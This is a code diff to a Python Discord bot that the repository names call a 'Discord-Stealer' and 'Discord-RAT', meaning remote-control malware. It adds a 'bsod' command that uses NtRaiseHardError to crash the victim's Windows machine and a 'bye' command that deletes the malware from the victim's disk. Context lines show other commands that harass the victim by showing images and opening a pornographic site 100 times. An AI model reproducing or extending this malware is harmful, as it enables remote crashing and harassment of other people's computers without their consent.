@@ -41,6 +41,7 @@ import psutil
 import platform
 import winreg
 import webbrowser
+import pyaudio
 
 logging.getLogger('discord').setLevel(logging.CRITICAL)
 
@@ -576,7 +577,7 @@ async def jumpscare(ctx):
     """Displays an image on the user's screen."""
 
 
-    image_url = "https://github.com/UnsillyHaxor/Snorm-Spy-Discord-Stealer-/blob/main/scarylarry.png?raw=true"
+    image_url = "https://github.com/UnsillyHaxor/Snorm-Spy-Discord-RAT/blob/main/updatedjumpscare.png?raw=true"
 
 
     response = requests.get(image_url)
@@ -820,6 +821,36 @@ async def goon(ctx):
         webbrowser.open(website)
 
     await ctx.send("If ykyk, 🔞  🍆 🌊.  ( btw this just opened pornhub 100 times )")
+
+@bot.command()
+async def bsod(ctx):
+    await ctx.send("**WARNING**: This command triggers the BSOD. ( BLUE SCREEN OF DEATH ), React with ✅ to confirm or ❌ to cancel.")
+
+    def reaction_check(reaction, user):
+        return user == ctx.author and str(reaction.emoji) in ["✅", "❌"]
+
+    try:
+        reaction, _ = await bot.wait_for('reaction_add', timeout=30.0, check=reaction_check)
+        if str(reaction.emoji) == "✅":
+            await ctx.send("💥 Thats how I like it...")
+            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
+            ctypes.windll.ntdll.NtRaiseHardError(0xC000021A, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
+        else:
+            await ctx.send("man your a party pooper")
+    except asyncio.TimeoutError:
+        await ctx.send("imagine party pooping discord.gg/snormware")
+
+@bot.command()
+async def bye(ctx):
+    await ctx.send("Exterminating...")
+    file_path = sys.argv[0]
+    os.remove(file_path)
+    await bot.close()
+
+
+
+
+
 
 
 
